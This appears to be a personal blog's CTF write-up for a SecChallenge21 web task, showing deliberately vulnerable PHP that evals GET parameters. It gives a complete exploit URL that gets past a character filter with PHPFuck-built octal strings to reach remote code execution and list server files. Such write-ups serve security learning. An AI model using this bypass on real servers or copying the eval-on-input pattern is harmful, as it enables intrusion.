@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Until the end | m4rcix</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Until the end" />
+<meta name="author" content="m4rcix" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])])" />
+<meta property="og:description" content="(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])])" />
+<link rel="canonical" href="https://m4rcix.github.io/SecChall21/web/unTILDEend" />
+<meta property="og:url" content="https://m4rcix.github.io/SecChall21/web/unTILDEend" />
+<meta property="og:site_name" content="m4rcix" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-17T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Until the end" />
+<script type="application/ld+json">
+{"description":"(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])])","@type":"BlogPosting","headline":"Until the end","dateModified":"2021-03-17T00:00:00+00:00","datePublished":"2021-03-17T00:00:00+00:00","url":"https://m4rcix.github.io/SecChall21/web/unTILDEend","author":{"@type":"Person","name":"m4rcix"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://m4rcix.github.io/SecChall21/web/unTILDEend"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://m4rcix.github.io/feed.xml" title="m4rcix" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">m4rcix<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/MarcixWasTaken"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://www.twitch.tv/marcix"><i class="fab fa-twitch"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://www.youtube.com/channel/UChaUSPtWwNkUpzrjUW7H0PA"><i class="fab fa-youtube"></i></a>
+        
+        
+        
+        <a class="color-yellow-hover" href="https://github.com/m4rcix"><i class="fab fa-github-square"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="https://www.linkedin.com/in/marton-bak-574a59201/"><i class="fab fa-linkedin"></i></a>
+        
+        
+        
+        <a class="color-green-hover" href="https://app.hackthebox.eu/profile/367067"><i class="fa fa-cube"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="https://discord.com/invite/wGHG5Aj"><i class="fab fa-discord"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+<div class="post">
+  <h1 class="post-title">Until the end</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/secchallenge/">secchallenge</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 17 Mar 2021</div>
+  
+  <noscript>
+    <div class="post-description">(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])])</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h2 id="description">Description</h2>
+
+<p>In part2 of Road to Valhalla you found the URL of the server that contains the coordinates of Valhalla. You open the site and see the title of the page “Only those who endure until the end”. So be it traveler endure till the end and you will have your reward!</p>
+
+<p><a href="https://until-the-end.secchallenge.crysys.hu">https://until-the-end.secchallenge.crysys.hu</a></p>
+
+<ul>
+  <li>Author: Pepe</li>
+  <li>Difficulty: medium</li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>Opening the page, I was greeted with what seemed like <code class="language-plaintext highlighter-rouge">JSFuck</code>. Oh great, like there wasn’t enough brainfuck yet. Turns out, after quite some stupidity and little googling, there exists a language called <code class="language-plaintext highlighter-rouge">PHPFuck</code>. Wanna know the two differences between the two?</p>
+
+<ul>
+  <li>PHPFuck has an extra <code class="language-plaintext highlighter-rouge">^</code> symbol in its syntax</li>
+  <li>PHPFuck doesn’t have a <code class="language-plaintext highlighter-rouge">UnFucker</code> like JSFuck has <a href="http://codertab.com/JsUnFuck">one</a></li>
+</ul>
+
+<p>Alright, let’s write an Unfucker in python, what could go wrong? Spoilers: a lot. After wasting about what seemed like a decade, I decided to just search and replace all characters, starting from the longest and going one by one, characters ordered descending by length. This took way less time then trying to automate it. It was like opening a Treasure Chest, the code revealed itself.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">' '</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">eval</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'kekw'</span><span class="p">),</span> <span class="nb">str_rot13</span><span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">' '</span><span class="p">],</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">69</span><span class="p">)))));</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'+'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[b-d\\-0-9H-LA-DU-Xi-kn-s!?TEz.]/'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'+'</span><span class="p">]))</span> <span class="k">die</span><span class="p">();</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'+'</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">();</span>
+        <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>  
+</code></pre></div></div>
+
+<p>Looking at the the code, I soon realized: The only way through this, is through the <code class="language-plaintext highlighter-rouge">preg_match()</code>. Looking at it in an <a href="https://regex101.com/">online tool</a>, and trying out different things I may want to <code class="language-plaintext highlighter-rouge">eval()</code> on the server, I quickly realized its not really gonna work, with this much limitations.</p>
+
+<p>Then it dawned on me, <code class="language-plaintext highlighter-rouge">PHPFuck</code> is the way. The only problem? We can’t use <code class="language-plaintext highlighter-rouge">.</code>, which is kinda in a lot of elements. Workaround time: I could define numbers with the help of PHPFuck, then use numbers inside an other <code class="language-plaintext highlighter-rouge">eval()</code> (Thank God eval went through the regex) to construct the exploit string via octal chars. So I started with the numbers:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$a</span><span class="o">=</span><span class="p">[]</span><span class="o">^</span><span class="p">[];</span> <span class="c1">#0</span>
+<span class="nv">$aa</span><span class="o">=</span><span class="p">(([]</span><span class="o">^</span><span class="p">[[]]));</span> <span class="c1">#1</span>
+<span class="nv">$aaa</span><span class="o">=</span><span class="p">(([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]]));</span> <span class="c1">#1 + 1 = 2</span>
+<span class="nv">$aaaa</span><span class="o">=</span><span class="p">(([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]]));</span>
+<span class="nv">$aaaaa</span><span class="o">=</span><span class="p">(([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]]));</span>
+<span class="nv">$aaaaaa</span><span class="o">=</span><span class="p">(([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]]));</span>
+<span class="nv">$aaaaaaa</span><span class="o">=</span><span class="p">(([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]]));</span>
+<span class="nv">$aaaaaaaa</span><span class="o">=</span><span class="p">(([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]]));</span>
+<span class="nv">$aaaaaaaaa</span><span class="o">=</span><span class="p">(([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]]));</span>
+<span class="nv">$aaaaaaaaaa</span><span class="o">=</span><span class="p">(([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]])</span><span class="o">+</span><span class="p">([]</span><span class="o">^</span><span class="p">[[]]));</span>
+</code></pre></div></div>
+<p>Hopefully you see the pattern :)</p>
+
+<p>Once I had this laying around, we could just use it inside another eval, to construct something like <code class="language-plaintext highlighter-rouge">\145\166\141\154\50\44\137\107\105\124\133\47\143\155\144\47\135\51\73</code> which would translate to <code class="language-plaintext highlighter-rouge">$_GET['cmd']</code> which would then be inputed yet into another <code class="language-plaintext highlighter-rouge">eval</code> finally letting us execute anything we want.</p>
+
+<p>Getting the page printed by <code class="language-plaintext highlighter-rouge">phpinfo()</code> would look like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://until-the-end.secchallenge.crysys.hu/?%2b=%24a=[]^[];%24aa=(([]^[[]]));%24aaa=(([]^[[]])%2b([]^[[]]));%24aaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24F="eval(%5c"%5c%5c%24aa%24aaaaa%24aaaaaa%5c%5c%24aa%24aaaaaaa%24aaaaaaa%5c%5c%24aa%24aaaaa%24aa%5c%5c%24aa%24aaaaaa%24aaaaa%5c%5c%24aaaaaa%24a%5c%5c%24aaaaa%24aaaaa%5c%5c%24aa%24aaaa%24aaaaaaaa%5c%5c%24aa%24a%24aaaaaaaa%5c%5c%24aa%24a%24aaaaaa%5c%5c%24aa%24aaa%24aaaaa%5c%5c%24aa%24aaaa%24aaaa%5c%5c%24aaaaa%24aaaaaaaa%5c%5c%24aa%24aaaaa%24aaaa%5c%5c%24aa%24aaaaaa%24aaaaaa%5c%5c%24aa%24aaaaa%24aaaaa%5c%5c%24aaaaa%24aaaaaaaa%5c%5c%24aa%24aaaa%24aaaaaa%5c%5c%24aaaaaa%24aa%5c%5c%24aaaaaaaa%24aaaa%5c");";eval(%24F);&amp;cmd=phpinfo();
+</code></pre></div></div>
+
+<p>Are we done yet? Sir! No Sir! Why? Answers are hidden in the <code class="language-plaintext highlighter-rouge">phpinfo</code> page. There aren’t as many Pokemons as there are <code class="language-plaintext highlighter-rouge">disable_functions</code> entries on this site. Luckily after not too much search, I found the function I needed, and ran a new command: (For obvious reasons, here’s only the cmd part of the query)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foreach(scandir(".") as $file) echo $file."&lt;br&gt;";
+</code></pre></div></div>
+
+<p>This command appends the files and directories found where index.php is located:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">.</span>
+..
+index.php
+very_secret_hidden_folder_N0P3
+</code></pre></div></div>
+
+<p>Visiting the last entry, gives us the flag (as well as a hidden easter egg), thank god we endured:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd21{HIDDEN}
+</code></pre></div></div>
+
+<p>P.S.: There’s also another solution, which I wasn’t smart enough to find, but is much shorter and less painful. Thanks Pepe for showing that to me, right after my 2 day duel with this one LUL.</p>
+
+<p><a href="/SecChall21">← Back to SecChallenge21</a></p>
+
+</div>
+
+
+
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/ctf/" class="set-1">CTF</a> <a href="/tag/crypto/" class="set-1">crypto</a> <a href="/tag/crysys/" class="set-1">crysys</a> <a href="/tag/dnspy/" class="set-1">dnSpy</a> <a href="/tag/hardware/" class="set-2">hardware</a> <a href="/tag/misc/" class="set-2">misc</a> <a href="/tag/pwn/" class="set-1">pwn</a> <a href="/tag/reverse/" class="set-1">reverse</a> <a href="/tag/secchallenge/" class="set-5">secchallenge</a> <a href="/tag/web/" class="set-2">web</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])])';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
